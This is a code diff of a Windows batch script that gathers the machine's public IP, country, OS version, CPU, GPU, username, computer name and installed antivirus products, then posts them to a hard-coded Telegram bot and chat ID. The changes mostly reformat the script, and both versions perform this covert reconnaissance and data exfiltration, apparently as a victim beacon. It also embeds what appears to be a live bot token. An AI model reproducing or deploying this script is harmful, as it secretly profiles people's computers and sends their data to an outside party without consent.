@@ -1,15 +1,40 @@
 setlocal EnableDelayedExpansion
 set "TOKEN=7615353876:AAF-Mcj1DDxs85m-pU4fAIR34jJ1r8y7p54"
 set "CHAT_ID=5674938532"
-for /f "tokens=1,2 delims=," %a in ('curl -s "http://ip-api.com/csv/?fields=country,query"') do (set "Country=%a" & set "IP=%b" & echo Country: !Country! & echo IP: !IP!)
-for /f "tokens=2 delims==" %a in ('wmic os get Caption /value') do set "Windows=%a"
-for /f "tokens=2 delims==" %a in ('wmic cpu get name /value') do set "CPU=%a"
-for /f "tokens=2 delims==" %a in ('wmic path win32_videocontroller get caption /value') do set "GPU=%a"
+
+for /f "tokens=1,2 delims=," %%a in ('curl -s "http://ip-api.com/csv/?fields=country,query"') do (
+    set "Country=%%a"
+    set "IP=%%b"
+    echo Country: !Country!
+    echo IP: !IP!
+)
+
+for /f "tokens=2 delims==" %%a in ('wmic os get Caption /value') do set "Windows=%%a"
+for /f "tokens=2 delims==" %%a in ('wmic cpu get name /value') do set "CPU=%%a"
+for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get caption /value') do set "GPU=%%a"
+
 set "Antivirus="
-for /f "tokens=2 delims==" %a in ('wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName /value') do (if defined Antivirus (set "Antivirus=!Antivirus!, %a") else (set "Antivirus=%a"))
-if defined ProgramFiles(x86) (set Arch=X64) else (set Arch=X86)
+for /f "tokens=2 delims==" %%a in (
+    'wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName /value'
+) do (
+    if defined Antivirus (
+        set "Antivirus=!Antivirus!, %%a"
+    ) else (
+        set "Antivirus=%%a"
+    )
+)
+
+if defined ProgramFiles(x86) (
+    set Arch=X64
+) else (
+    set Arch=X86
+)
+
 set "UserName=%USERNAME%"
 set "Worker=%COMPUTERNAME%"
 set "MESSAGE=RUS%0AIP: !IP!%0ACountry: !Country!%0AWorker: !Worker!%0AUserName: !UserName!%0AWindows: !Windows! !Arch!%0ACPU: !CPU!%0AGPU: !GPU!%0AAntivirus: !Antivirus!"
-curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=%MESSAGE%"
+
+curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
+  -d "chat_id=%CHAT_ID%" -d "text=%MESSAGE%"
+
 endlocal
